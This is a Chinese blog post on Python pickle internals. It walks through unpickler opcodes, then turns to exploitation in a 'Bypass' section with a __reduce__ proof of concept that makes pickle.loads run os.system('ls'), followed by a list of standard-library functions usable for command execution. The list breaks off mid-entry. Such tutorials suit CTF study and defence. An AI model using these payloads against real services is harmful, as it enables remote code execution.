<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>python-Pickle序列化 | Rick</title><meta name="author" content="LYC"><meta name="copyright" content="LYC"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Pickle构造原理 0x00 Pickle是干什么用的：序列化、反序列化 在很多任务中，我们可能会需要把一些内容存储起来，以备后续利用。如果我们要存储的内容只是一条字符串或是数字，那么我们只需要把它写进文件就行。然而，如果我们需要存储的东西是一个dict、一个list，甚至一个对象： 123456class dairy():    date &#x3D; 20191029    text &#x3D; &quot;">
<meta property="og:type" content="article">
<meta property="og:title" content="python-Pickle序列化">
<meta property="og:url" content="http://991688344.github.io/2020/03/07/python-Pickle%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
<meta property="og:site_name" content="Rick">
<meta property="og:description" content="Pickle构造原理 0x00 Pickle是干什么用的：序列化、反序列化 在很多任务中，我们可能会需要把一些内容存储起来，以备后续利用。如果我们要存储的内容只是一条字符串或是数字，那么我们只需要把它写进文件就行。然而，如果我们需要存储的东西是一个dict、一个list，甚至一个对象： 123456class dairy():    date &#x3D; 20191029    text &#x3D; &quot;">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://991688344.github.io/images/Wallpaper/eatham.gif">
<meta property="article:published_time" content="2020-03-06T22:58:11.000Z">
<meta property="article:modified_time" content="2024-03-19T01:32:36.453Z">
<meta property="article:author" content="LYC">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="安全">
<meta property="article:tag" content="Python">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://991688344.github.io/images/Wallpaper/eatham.gif"><link rel="shortcut icon" href="/images/Wallpaper/favicon.ico"><link rel="canonical" href="http://991688344.github.io/2020/03/07/python-Pickle%E5%BA%8F%E5%88%97%E5%8C%96/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/content.json","preload":true,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'python-Pickle序列化',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  isShuoshuo: false
}</script><link rel="stylesheet" href="/mycss/my_background.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-color: #F7F9FE;"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/images/head.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">251</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">37</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">49</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fas fa-paper-plane"></i><span> 留言板</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/images/Wallpaper/eatham.gif);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Rick</span></a><a class="nav-page-title" href="/"><span class="site-name">python-Pickle序列化</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fas fa-paper-plane"></i><span> 留言板</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">python-Pickle序列化</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-03-06T22:58:11.000Z" title="发表于 2020-03-07 06:58:11">2020-03-07</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-03-19T01:32:36.453Z" title="更新于 2024-03-19 09:32:36">2024-03-19</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%AE%89%E5%85%A8/">安全</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%AE%89%E5%85%A8/Python/">Python</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">13.4k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>55分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1>Pickle构造原理</h1>
<h2 id="0x00-Pickle是干什么用的：序列化、反序列化">0x00 Pickle是干什么用的：序列化、反序列化</h2>
<p>在很多任务中，我们可能会需要把一些内容存储起来，以备后续利用。如果我们要存储的内容只是一条字符串或是数字，那么我们只需要把它写进文件就行。然而，如果我们需要存储的东西是一个dict、一个list，甚至一个对象：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">class dairy():</span><br><span class="line">    date = 20191029</span><br><span class="line">    text = &quot;今天哈尔滨冷死人了QAQ&quot;</span><br><span class="line">    todo = [&#x27;大物实验报告&#x27;, &#x27;CTF题&#x27;, &#x27;CSAPP作业&#x27;]</span><br><span class="line"></span><br><span class="line">today = dairy()</span><br></pre></td></tr></table></figure>
<p>要把这样的dairy实例<code>today</code>存放在文件里，日后还要支持随时导入，就是很麻烦的事情了。通行的做法是：通过一套方案，把这个<code>today</code> <strong>翻译</strong>成一个字符串，然后把字符串写进文件；读取的时候，通过读文件拿到字符串，然后<strong>翻译</strong>成<code>dairy</code>类的一个实例。</p>
<p>我们把“对象 -&gt; 字符串”的翻译过程称为“序列化”；相应地，把“字符串 -&gt; 对象”的过程称为“反序列化”  。需要保存一个对象的时候，就把它序列化变成字符串；需要从字符串中提取一个对象的时候，就把它反序列化。各大语言都有序列化库，而很多时候，<strong>不恰当的反序列化会成为攻击的目标</strong>。在后文我们将深入探讨其利用方式。</p>
<p>Python提供的序列化库是pickle. 下面，我们举一个例子来说明其工作方式：</p>
<p><img src="/2020/03/07/python-Pickle%E5%BA%8F%E5%88%97%E5%8C%96/v2-f49bd31386a3bbca41901e3d24c4942d_720w.jpg" alt="img">序列化与反序列化</p>
<p>在这里，我们定义了一个很复杂的对象交给<code>x</code>，然后执行<code>pickle.dumps(x)</code>，来把<code>x</code>翻译成字符串。**这个字符串又臭又长，不过我们在接下来的章节中会详细讲如何阅读它。**接下来，把这个字符串翻译成对象交给<code>r</code>，可以发现<code>r</code>已经是我们最开始打包的那个复杂对象。</p>
<p>存储字符串比存储对象方便得多——这就是pickle的意义所在。工作过程如下图：</p>
<p><img src="/2020/03/07/python-Pickle%E5%BA%8F%E5%88%97%E5%8C%96/v2-c01327e7df64f9e3ccd13a9e19f72875_720w.jpg" alt="img">把对象序列化成字符串，然后就可以方便地存储、传输了</p>
<p>这就是pickle最基础的使用方法。pickle不仅可以读写字符串，也可以读写文件：只需要采用<code>pickle.dump()</code>和<code>pickle.load()</code>.</p>
<p>另外有一点需要注意：对于我们自己定义的class，如果直接以形如<code>date = 20191029</code>的方式赋初值，**则这个<code>date</code>不会被打包！**解决方案是写一个<code>__init__</code>方法， 也就是这样：</p>
<p><img src="/2020/03/07/python-Pickle%E5%BA%8F%E5%88%97%E5%8C%96/v2-52974741a1a6322f3f892d6428373177_720w.jpg" alt="img">注意自己定义的class，一定要把初值写进__init__</p>
<h2 id="0x01-pickle-loads机制：调用-Unpickler类">0x01 pickle.loads机制：调用_Unpickler类</h2>
<p>pickle.loads是一个供我们调用的接口。其底层实现是基于<code>_Unpickler</code>类。代码实现如下：</p>
<p><img src="/2020/03/07/python-Pickle%E5%BA%8F%E5%88%97%E5%8C%96/v2-579207611b45146b993b7b6ddd1d8cec_720w.jpg" alt="img">load和loads接口</p>
<p>可以看出，<code>_load</code>和<code>_loads</code>基本一致，都是把各自输入得到的东西作为文件流，喂给<code>_Unpickler</code>类；然后调用<code>_Unpickler.load()</code>实现反序列化。</p>
<p>所以，接下来的任务就很清楚了：读一遍<code>_Unpickler</code>类的源码，然后弄清楚它干了什么事。</p>
<h2 id="0x02-Unpickler类：莫得感情的反序列化机器">0x02 _Unpickler类：莫得感情的反序列化机器</h2>
<p>在反序列化过程中，<code>_Unpickler</code>（以下称为机器吧）维护了两个东西：栈区和存储区。结构如下（本图片仅为示意图）：</p>
<p><img src="/2020/03/07/python-Pickle%E5%BA%8F%E5%88%97%E5%8C%96/v2-5e2eeae4c4943c31aee406fa3b467301_720w.jpg" alt="img">机器维护的两个结构</p>
<p><strong>栈</strong>是unpickle机最核心的数据结构，所有的数据操作几乎都在栈上。为了应对数据嵌套，栈区分为两个部分：当前栈专注于维护<strong>最顶层的信息</strong>，而前序栈维护下层的信息。这两个栈区的操作过程将在讨论MASK指令时解释。</p>
<p><strong>存储区</strong>可以类比内存，用于存取变量。它是一个数组，以<strong>下标</strong>为索引。它的每一个单元可以用来存储任何东西，但是说句老实话，大多数情况下我们并不需要这个存储区。</p>
<p>您可以想象，一台机器读取我们输入的字符串，然后操作自己内部维护的各种结构，最后吐出来一个结果——这就是我们莫得感情的<code>_Unpickler</code>。为了研究它，也为了看懂那些乱七八糟的字符串，我们需要一个有力的调试器。这就是<code>pickletools</code>。</p>
<h2 id="0x03-pickletools：良心调试器">0x03 pickletools：良心调试器</h2>
<p>pickletools是python自带的pickle调试器，有三个功能：<strong>反汇编</strong>一个已经被打包的字符串、<strong>优化</strong>一个已经被打包的字符串、返回一个迭代器来供程序使用。我们一般使用前两种。来看看效果吧：</p>
<p><img src="/2020/03/07/python-Pickle%E5%BA%8F%E5%88%97%E5%8C%96/v2-1a929863ed21996548d6f7c93759e619_720w.jpg" alt="img"></p>
<p><img src="/2020/03/07/python-Pickle%E5%BA%8F%E5%88%97%E5%8C%96/v2-5a4aedd8db8446ba20bd0421d5e1288a_720w.jpg" alt="img">原始字符串的反汇编结果</p>
<p>这就是反汇编功能：解析那个字符串，然后告诉你这个字符串干了些什么。**每一行都是一条指令。**接下来试一试优化功能：</p>
<p><img src="/2020/03/07/python-Pickle%E5%BA%8F%E5%88%97%E5%8C%96/v2-2300f9b2a1c93e09e146c9683c5a74fb_720w.jpg" alt="img"></p>
<p><img src="/2020/03/07/python-Pickle%E5%BA%8F%E5%88%97%E5%8C%96/v2-c54043a85cd8b19a70fb751c65344a4e_720w.jpg" alt="img">优化后的结果</p>
<p>可以看到，字符串<code>s</code>比以前短了很多，而且反汇编结果中，<code>BINPUT</code>指令没有了。所谓“优化”，其实就是把不必要的<code>PUT</code>指令给删除掉。这个<code>PUT</code>意思是把当前栈的栈顶复制一份，放进储存区——很明显，我们这个class并不需要这个操作，可以省略掉这些<code>PUT</code>指令。</p>
<p>利用pickletools，我们能很方便地看清楚每条语句的作用、检验我们手动构造出的字符串是否合法……总之，是我们调试的利器。现在手上有了工具，我们开始研究这个字符串是如何被pickle解读的吧。</p>
<p><strong>以下内容建议对照pickle的源码来阅读</strong>。您可以这样找到pickle源码的位置：</p>
<p><img src="/2020/03/07/python-Pickle%E5%BA%8F%E5%88%97%E5%8C%96/v2-c2418d1ee750ef599becec3de5724abe_720w.jpg" alt="img"></p>
<h2 id="0x04-反序列化机器：语法严格、向前兼容">0x04 反序列化机器：语法严格、向前兼容</h2>
<p>pickle构造出的字符串，有很多个版本。在pickle.loads时，可以用Protocol参数指定协议版本，例如指定为0号版本：</p>
<p><img src="/2020/03/07/python-Pickle%E5%BA%8F%E5%88%97%E5%8C%96/v2-77a48037eeb2dc95334ae0311b4de9cf_720w.jpg" alt="img">依据0号协议所编码的字符串</p>
<p>目前这些协议有0,2,3,4号版本，默认为3号版本。这所有版本中，0号版本是人类最可读的；之后的版本加入了一大堆不可打印字符，不过这些新加的东西都只是为了优化，本质上没有太大的改动。</p>
<p>一个好消息是，<strong>pickle协议是向前兼容的</strong>。0号版本的字符串可以直接交给pickle.loads()，不用担心引发什么意外。</p>
<p>刚刚说过，字符串中包含了很多条指令。这些指令一定以<strong>一个字节</strong>的指令码（opcode）开头；接下来读取多少内容，由指令码来决定（严格规定了读取几个参数、参数的结束标志符等）。<strong>指令编码是紧凑的</strong>，一条指令结束之后立刻就是下一条指令。</p>
<h3 id="一起来分析一个小例子：">一起来分析一个小例子：</h3>
<p><img src="/2020/03/07/python-Pickle%E5%BA%8F%E5%88%97%E5%8C%96/v2-d5bb5c00844a18dcb3b49883383061d7_720w.jpg" alt="img"></p>
<p>第一行是字符串，接下来是这个字符串的反汇编结果</p>
<ol>
<li>
<p>字符串的第一个字节是<code>\x80</code>（这个操作符于版本2被加入）。机器看到这个操作符，立刻再去字符串读取一个字节，得到<code>x03</code>。解释为“这是一个依据3号协议序列化的字符串”，这个操作结束。</p>
</li>
<li>
<p>机器取出下一个字符作为操作符——<code>c</code>。这个操作符（称为GLOBAL操作符）对我们以后的工作非常有用——它<strong>连续读取两个字符串</strong><code>module</code>和<code>name</code>，规定以<code>\n</code>为分割；接下来把<code>module.name</code>这个东西<strong>压进栈</strong>。那么现在读取到的两个字符串分别是<code>__main__</code>和<code>Student</code>，于是把<code>__main__.Student</code>扔进栈里。</p>
<blockquote>
<p>注：GLOBAL操作符读取全局变量，是使用的<code>find_class</code>函数。而<code>find_class</code>对于不同的协议版本实现也不一样。总之，它干的事情是“去<code>x</code>模块找到<code>y</code>”，<code>y</code>必须在<code>x</code>的顶层（也即，y不能在嵌套的内层）。</p>
</blockquote>
</li>
<li>
<p>程序的车轮继续滚滚向前。它遇到了<code>)</code>这个操作符。它的作用是“把一个空的tuple压入当前栈”。处理完这个操作符之后</p>
</li>
<li>
<p>接下来程序读取到了<code>x81</code>操作符。它的作用是：从栈中先弹出一个元素，记为<code>args</code>；再弹出一个元素，记为<code>cls</code>。接下来，执行<code>cls.__new__(cls, *args)</code> ，然后把得到的东西压进栈。说人话，那就是：从栈中弹出一个参数和一个class，然后利用这个参数实例化class，把得到的实例压进栈。<br>
　　容易看出，上面的操作全都执行完了之后，栈里面还剩下一个元素——它是被实例化了的<code>Student</code>对象，目前这里面什么也没有，因为当初实例化它的时候，<code>args</code>是个空的数组。</p>
</li>
<li>
<p>让我们继续分析。程序现在读入了一个<code>&#125;</code>，它的意思是“把一个空的dict压进栈”。</p>
</li>
<li>
<p>然后是<code>MARK</code>操作符<code>(</code>，这个操作符干的事情称为<code>load_mark</code>：</p>
<ul>
<li>把<strong>当前栈</strong>这个整体，作为一个list，压进<strong>前序栈</strong>。</li>
<li>把<strong>当前栈</strong>清空。<br>
　　现在您知道为什么栈区要分成当前栈和前序栈两部分了吗？前序栈保存了程序运行至今的（不在顶层的）完整的栈信息，而当前栈专注于处理顶层的事件。<br>
　　讲到这里，我们不得不介绍另一个操作——<code>pop_mark</code>。它没有操作符，只供其他的操作符来调用。干的事情自然是<code>load_mark</code>的反向操作：</li>
<li>记录一下当前栈的信息，作为一个list，在<code>load_mark</code>结束时返回。</li>
<li>弹出<strong>前序栈</strong>的栈顶，用这个list来覆盖<strong>当前栈</strong>。<br>
<code>load_mark</code>相当于进入一个子过程，而<code>pop_mark</code>相当于从子过程退出，把栈恢复成<strong>调用子过程之前</strong>的情况。<strong>所有与栈的切换相关的事情，都靠调用这两个方法来完成</strong>。因此<code>load_mark</code>和<code>pop_mark</code>是栈管理的核心方法。<br>
　　回到我们这个程序，继续看MARK之后的内容：<br>
<img src="/2020/03/07/python-Pickle%E5%BA%8F%E5%88%97%E5%8C%96/v2-d5bb5c00844a18dcb3b49883383061d7_720w-1584003774482.jpg" alt="img"></li>
</ul>
</li>
<li>
<p>下一个操作符是<code>V</code>。它的意义是：读入一个字符串，以<code>\n</code>结尾；然后把这个字符串压进栈中。我们看到这里有四个<code>V</code>操作，它们全都执行完的时候，<strong>当前栈</strong>里面的元素是：（由底到顶）<code>name, rxz, grade, G2</code>。前序栈只有一个元素，是一个list，这个list里面有两个元素：一个空的<code>Student</code>实例，以及一个空的<code>dict</code>。</p>
</li>
<li>
<p>现在我们看到了<code>u</code>操作符。它干这样的事情：</p>
<ul>
<li>调用<code>pop_mark</code>。也就是说，把当前栈的内容扔进一个数组<code>arr</code>，然后把当前栈恢复到MARK时的状态。<br>
执行完成之后，<code>arr=['name', 'rxz', 'grade', 'G2']</code>；当前栈里面存的是<code>__main__.Student</code>这个类、一个空的<code>dict</code></li>
<li>拿到当前栈的末尾元素，规定必须是一个<code>dict</code>。<br>
这里，读到了栈顶那个空<code>dict</code>。</li>
<li>两个一组地读<code>arr</code>里面的元素，前者作为key，后者作为value，存进上一条所述的<code>dict</code>。<br>
　　模拟一下这个过程，发现原先是空的那个<code>dict</code>现在变成了<code>&#123;'name': 'rxz', 'grade': 'G2'&#125;</code>这样一个<code>dict</code>。所以现在，当前栈里面的元素是：<code>__main__.Student</code>的一个空的实例，以及<code>&#123;'name': 'rxz', 'grade': 'G2'&#125;</code>这个<code>dict</code>。</li>
</ul>
</li>
<li>
<p>下一个指令码是<code>b</code>，也就是BUILD指令。它干的事情是：</p>
<ul>
<li>把当前栈栈顶存进<code>state</code>，然后弹掉。</li>
<li>把当前栈栈顶记为<code>inst</code>，然后弹掉。</li>
<li>利用<code>state</code>这一系列的值来<strong>更新实例</strong><code>inst</code>。把得到的对象扔进当前栈。</li>
</ul>
<blockquote>
<p>注：这里更新实例的方式是：如果<code>inst</code>拥有<code>__setstate__</code>方法，则把<code>state</code>交给<code>__setstate__</code>方法来处理；否则的话，直接把<code>state</code>这个<code>dist</code>的内容，合并到<code>inst.__dict__</code> 里面。<br>
事实上，这里产生了一个安全漏洞。您可以想一想该如何利用。</p>
</blockquote>
</li>
<li>
<p>上面的事情干完之后，当前栈里面只剩下了一个实例——它的类型是<code>__main__.Student</code>，里面<code>name</code>值是<code>rxz</code>，<code>grade</code>值是<code>G2</code>。下一个指令是<code>.</code>（一个句点，STOP指令），pickle的字符串以它结尾，意思是：“当前栈顶元素就是反序列化的最终结果，把它弹出，收工！”</p>
</li>
</ol>
<blockquote>
<p>注：使用<code>pickletools.dis</code>分析一个字符串时，如果<code>.</code>执行完毕之后栈里面还有东西，会抛出一个错误；而<code>pickle.loads</code>没有这么严格的检查——它会正常结束。<br>
　　当所有的事情干完之后，我们得到了什么呢？如下图所示：<br>
<img src="/2020/03/07/python-Pickle%E5%BA%8F%E5%88%97%E5%8C%96/v2-f72f273bdb1efc8bbc0e81b23288c5d7_720w.jpg" alt="img">反序列化大成功<br>
　　至此我们完成了一个简单例子的分析。刚刚我们通过手动模拟这台机器的运行过程，理解了pickle反序列化的原理——如何处理指令、如何管理栈等等。这已经足够我们把握pickle的思想，剩余的就是细枝末节的东西了。</p>
</blockquote>
<p>但是，细枝末节的东西，往往暗藏着漏洞 :）</p>
<h1>Bypass</h1>
<p><a target="_blank" rel="noopener" href="http://blog.nsfocus.net/%e7%bb%95%e8%bf%87-restrictedunpickler/">http://blog.nsfocus.net/绕过-restrictedunpickler/</a></p>
<p><a target="_blank" rel="noopener" href="http://www.bendawang.site/2018/04/18/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E8%8A%B1%E5%BC%8F%E5%88%A9%E7%94%A8/">Python反序列化漏洞的花式利用</a></p>
<h2 id="0x01-reduce-：（曾经的）万恶之源">0x01 <code>__reduce__</code>：（曾经的）万恶之源</h2>
<p>在写下本文之前，CTF竞赛对pickle的利用多数是在<code>__reduce__</code>方法上。它的指令码是<code>R</code>，干了这么一件事情：</p>
<ul>
<li>取当前栈的栈顶记为<code>args</code>，然后把它弹掉。</li>
<li>取当前栈的栈顶记为<code>f</code>，然后把它弹掉。</li>
<li>以<code>args</code>为参数，执行函数<code>f</code>，把结果压进当前栈。</li>
</ul>
<p>class的<code>__reduce__</code>方法，在pickle反序列化的时候会被执行。其底层的编码方法，就是利用了<code>R</code>指令码。 <code>f</code>要么返回字符串，要么返回一个tuple，后者对我们而言更有用。</p>
<p>一种很流行的攻击思路是：利用 <code>__reduce__</code> 构造恶意字符串，当这个字符串被反序列化的时候，<code>__reduce__</code>会被执行。网上已经有海量的文章谈论这种方法，所以我们在这里不过多讨论。只给出一个例子：正常的字符串反序列化后，得到一个<code>Student</code>对象。我们想构造一个字符串，它在反序列化的时候，执行<code>ls /</code>指令。那么我们只需要这样得到payload：</p>
<p><img src="/2020/03/07/python-Pickle%E5%BA%8F%E5%88%97%E5%8C%96/v2-29d11dda8c1744f64b20ef442faea55a_720w.jpg" alt="img">optimize加不加无所谓，这里为了我们查看汇编结果方便，就加上了优化</p>
<p>现在把payload拿给正常的程序（Student类里面没有<code>__reduce__</code>方法）去解析：</p>
<p><img src="/2020/03/07/python-Pickle%E5%BA%8F%E5%88%97%E5%8C%96/v2-4d98856db66940a5344270579de631b2_720w.jpg" alt="img">即使Student类是正常的，pickle.loads仍然执行了os.system('ls /')</p>
<p>一个样例如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">test</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (os.system,(<span class="string">&#x27;ls&#x27;</span>,))</span><br><span class="line"></span><br><span class="line">a=test()</span><br><span class="line">payload=pickle.dumps(a)</span><br><span class="line"><span class="built_in">print</span> payload</span><br><span class="line">pickle.loads(payload)</span><br></pre></td></tr></table></figure>
<p>其中<code>pickle.loads</code>是会解决import 问题，对于未引入的module会自动尝试import。那么也就是说整个python标准库的代码执行、命令执行函数我们都可以使用。 之前把python的标准库都大概过了一遍，把其中绝大多数的可用函数罗列如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>, execfile, <span class="built_in">compile</span>, <span class="built_in">open</span>, file, <span class="built_in">map</span>, <span class="built_in">input</span>,</span><br><span class="line">os.system, os.popen, os.popen2, os.popen3, os.popen4, os.<span class="built_in">open</span>, os.pipe,</span><br><span class="line">os.listdir, os.access,</span><br><span class="line">os.execl, os.execle, os.execlp, os.execlpe, os.execv,</span><br><span class="line">os.execve, os.execvp, os.execvpe, os.spawnl, os.spawnle, os.spawnlp, os.spawnlpe,</span><br><span class="line">os.spawnv, os.spawnve, os.spawnvp, os.spawnvpe,</span><br><span class="line">pickle.load, pickle.loads,cPickle.load,cPickle.loads,</span><br><span class="line">subprocess.call,subprocess.check_call,subprocess.check_output,subprocess.Popen,</span><br><span class="line">commands.getstatusoutput,commands.getoutput,commands.getstatus,</span><br><span class="line">glob.glob,</span><br><span class="line">linecache.getline,</span><br><span class="line">shutil.copyfileobj,shutil.copyfile,shutil.copy,shutil.copy2,shutil.move,shutil.make_archive,</span><br><span class="line">dircache.listdir,dircache.opendir,</span><br><span class="line">io.<span class="built_in">open</span>,</span><br><span class="line">popen2.popen2,popen2.popen3,popen2.popen4,</span><br><span class="line">timeit.timeit,timeit.repeat,</span><br><span class="line">sys.call_tracing,</span><br><span 